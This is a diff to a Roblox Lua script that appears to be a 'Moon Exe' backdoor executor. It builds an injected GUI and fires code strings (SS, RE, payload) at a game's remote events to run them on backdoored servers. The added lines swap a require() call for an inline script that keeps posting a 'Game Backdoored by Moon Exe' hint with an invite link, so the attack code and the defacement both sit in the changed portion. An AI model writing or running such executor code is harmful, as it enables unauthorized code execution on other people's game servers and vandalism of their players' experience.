@@ -11,7 +11,7 @@
 local G2L = {};
 
 -- StarterGui.ScreenGui
-G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
+G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
 G2L["1"]["IgnoreGuiInset"] = true;
 G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
@@ -584,20 +584,34 @@ local script = G2L["d"];
 		end
 		]]
 		
+		local Hint = [[
+		local hint = Instance.new("Hint", game.Workspace)
+		hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
+		
+		while true do
+			wait(5)
+			hint:Destroy()
+			wait(5)
+			local hint = Instance.new("Hint", game.Workspace)
+			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
+		end
+		]]
+		if remote then
+			pcall(function() remote:InvokeServer(SS) end)
+			pcall(function() remote:FireServer(SS) end)
+		end
 		
 		pcall(function()
 			if isFunction then
 				task.spawn(function()
-					pcall(function() remote:InvokeServer(SS) end)
 					pcall(function() remote:InvokeServer(RE) end)
-					pcall(function() remote:InvokeServer('require(135960332388305).H()') end) --- its hint dumbass
+					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
 					pcall(function() remote:InvokeServer(payload) end)
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
 				end)
 			else
 				pcall(function() remote:FireServer(RE) end)
-				pcall(function() remote:FireServer(SS) end)
-				pcall(function() remote:FireServer('require(135960332388305).H()') end) --- its hint dumbass
+				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
 			end
